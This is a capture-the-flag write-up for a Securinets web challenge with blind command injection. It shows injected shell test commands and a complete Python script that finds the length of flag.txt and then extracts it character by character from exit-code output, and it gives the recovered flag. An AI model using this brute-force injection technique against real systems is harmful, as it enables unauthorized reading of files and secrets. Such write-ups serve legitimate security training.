# 0s & 1s Solver

## understanding the output 

we understand from the description that this webpage execute system commands which may raise a command injection vulnerability 

we try executing some linux commands like ``ls`` , ``whoami``, ... and we notice that the output is either 0 or 1 which leads me to understand that it may be the exit code (either false or true) 

after understanding the code we can try ``cat flag.txt`` , we get an output of ``1`` which means flag.txt exists 

this is called a blind injection , and we can go arround it by using command that return either true or false , to check the first letter we can use the command ``[ "$(head -c 1 flag*)" = "S" ]`` \
this returns ``1`` which we know is true because we know that our flag starts with ``Securinets{`` 

we go ahead and write a small python script to find the flag :

```
import requests
import re

def execute_command(command):
    url = 'http://terminaltreachery2.web.securinets.tn/exec' 
    data = {'command': command}
    
    try:
        response = requests.post(url, data=data)
        response.raise_for_status() 
        match = re.search(r'<pre>(.*?)</pre>', response.text)
        if match:
            value = match.group(1) 
            return int(value)
        else:
            print("No value found within <pre> tags.")
    except requests.exceptions.RequestException as e:
        print("An error occurred:", e)

def find_length():
    x = 50
    while True:
        print(x,sep='|')
        command = '[ "$(wc -c < flag.txt |awk \'{$1=$1};1\')"  -gt '+str(x)+' ]' 
        if execute_command('[ "$(wc -c < flag.txt |awk \'{$1=$1};1\')"  = '+str(x)+' ]') :
            break
        elif execute_command(command) == 0 :
            x = x - 1
        else :
            x = x +1 
    return x

def find_flag(x):
    begin = "Securinets{"
    flag = begin
    x = x - len(begin) 
    letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!_{}"
    
    for i in range(len(begin), len(begin) + x):  
        found_letter = False  
        for letter in letters:
            command = f'[ "$(head -c {i+1} flag.txt)" = "{flag + letter}" ]'  
            if execute_command(command) == 1:
                print("Found letter:", letter)
                flag += letter 
                found_letter = True
                break  

        if not found_letter:
            print("No letter found for position", i) 
        print(flag)
        print(f"{x - (i - len(begin) + 1)} letters remaining")  

    return flag



if __name__ == '__main__':
    x=find_length()
    print("the length is :",x)
    flag = find_flag(x)
    print("your flag is : ",flag)
```
after running this script we get that the flag is ``Securinets{0s_and_1s_RUL3}``

written by : **Chuuya**